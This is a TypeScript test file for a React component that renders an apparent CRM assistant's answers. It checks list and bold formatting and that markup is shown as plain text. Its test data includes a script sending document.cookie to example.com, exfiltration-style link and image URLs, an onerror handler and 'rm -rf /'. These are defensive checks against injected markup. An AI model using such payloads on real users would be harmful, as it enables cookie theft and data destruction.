import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { AnswerText } from "./AnswerText";
import { EVENTS } from "./test-copilot";

/** Anything that could be clicked, load something or run, and the markup Z6 leaves as typed. */
const MADE_ELSEWHERE = "a, img, script, iframe, object, embed, link, style, table, h1, h2, h3, h4, h5, h6";

function draw(text: string) {
  return render(<AnswerText text={text} />).container;
}

function texts(elements: Iterable<Element>) {
  return [...elements].map((element) => element.textContent);
}

describe("an answer", () => {
  it("parts into paragraphs at a blank line", () => {
    const answer = draw("Two deals close this month.\n\nBoth are in Negotiation.");
    expect(texts(answer.querySelectorAll("p"))).toEqual(["Two deals close this month.", "Both are in Negotiation."]);
  });

  it("keeps a line break inside a paragraph", () => {
    const answer = draw("First line\nSecond line");
    expect(texts(answer.querySelectorAll("p"))).toEqual(["First line\nSecond line"]);
  });

  it("makes a bulleted list from lines starting with a dash, an asterisk, a plus or a bullet", () => {
    const answer = draw("These close this month:\n- Harbor & Pine renewal\n* Office move\n+ Pilot\n• Upgrade");
    expect(texts(answer.querySelectorAll("p"))).toEqual(["These close this month:"]);
    expect(answer.querySelectorAll("ul")).toHaveLength(1);
    expect(texts(answer.querySelectorAll("ul > li"))).toEqual([
      "Harbor & Pine renewal",
      "Office move",
      "Pilot",
      "Upgrade",
    ]);
  });

  it("makes a numbered list, starting where the answer starts it", () => {
    const answer = draw("1. Call Sam\n2) Send the quote\n\n4. Chase the invoice\n5. Close the deal");
    const lists = answer.querySelectorAll("ol");
    expect(lists).toHaveLength(2);
    expect(texts(lists[0].querySelectorAll("li"))).toEqual(["Call Sam", "Send the quote"]);
    expect(lists[0].getAttribute("start")).toBeNull();
    expect(texts(lists[1].querySelectorAll("li"))).toEqual(["Chase the invoice", "Close the deal"]);
    expect(lists[1].getAttribute("start")).toBe("4");
  });

  it("carries an indented line on as part of the item above", () => {
    const answer = draw("- Harbor & Pine renewal\n  closes Nov 30, 2026\n- Office move");
    expect(texts(answer.querySelectorAll("li"))).toEqual(["Harbor & Pine renewal\ncloses Nov 30, 2026", "Office move"]);
  });

  it("ends a list at a line that isn't indented or another item", () => {
    const answer = draw("- Harbor & Pine renewal\nThat's the only one.");
    expect(texts(answer.querySelectorAll("li"))).toEqual(["Harbor & Pine renewal"]);
    expect(texts(answer.querySelectorAll("p"))).toEqual(["That's the only one."]);
  });

  it("picks out bold, in paragraphs and in lists", () => {
    const answer = draw(`${EVENTS.answer.text}\n\n- **Office move** closes **Dec 2**`);
    expect(texts(answer.querySelectorAll("strong"))).toEqual(["Harbor & Pine renewal", "Office move", "Dec 2"]);
    expect(answer.querySelector("p")!.textContent).toBe(
      "Done. Harbor & Pine renewal is now Won, and Sam Carter is a customer.",
    );
  });

  it.each([
    ["two asterisks left open", "Done. **Harbor & Pine is now Won"],
    ["asterisks around spaces", "Profit is ** up ** this month"],
    ["a single asterisk", "The *only* deal"],
    ["underscores", "The __only__ deal"],
  ])("leaves %s as typed", (_, text) => {
    const answer = draw(text);
    expect(answer.textContent).toBe(text);
    expect(answer.querySelector("strong")).toBeNull();
  });

  it("isn't fooled by a figure or a bold word at the start of a line", () => {
    const answer = draw("**Two** deals close this month.\n1.5 million is the total.");
    expect(answer.querySelectorAll("ul, ol")).toHaveLength(0);
    expect(answer.querySelector("p")!.textContent).toBe("Two deals close this month.\n1.5 million is the total.");
  });
});

describe("anything else in an answer", () => {
  it.each([
    ["a link", "Open [the deal](https://example.com/steal?token=1) to check."],
    ["a bare address", "See https://example.com/deals for more."],
    ["an image", "![chart](https://example.com/pixel.png?records=all)"],
    ["a heading", "# Deals closing this month"],
    ["a table", "| Deal | Value |\n|---|---|\n| Office move | $12,000 |"],
    ["a script", '<script>fetch("https://example.com/?" + document.cookie)</script>'],
    ["HTML", '<a href="https://example.com">Open</a> <img src="https://example.com/x.png" onerror="alert(1)">'],
    ["code", "Run `npm run dev` and\n```\nrm -rf /\n```"],
  ])("shows %s as the characters typed, with nothing made from it", (_, text) => {
    const answer = draw(text);
    expect(answer.textContent).toBe(text);
    expect(answer.querySelectorAll(MADE_ELSEWHERE)).toHaveLength(0);
  });

  it("leaves a link inside a list or bold as typed too", () => {
    const answer = draw("- **[Open](https://example.com)**\n- <b>bold</b>");
    expect(texts(answer.querySelectorAll("li"))).toEqual(["[Open](https://example.com)", "<b>bold</b>"]);
    expect(answer.querySelectorAll(MADE_ELSEWHERE)).toHaveLength(0);
    expect(answer.querySelectorAll("b")).toHaveLength(0);
  });

  it("makes nothing that can be pressed or focused", () => {
    draw("[Open](/deals/12)\n\n<button>Delete</button>");
    expect(screen.queryAllByRole("link")).toHaveLength(0);
    expect(screen.queryAllByRole("button")).toHaveLength(0);
  });
});
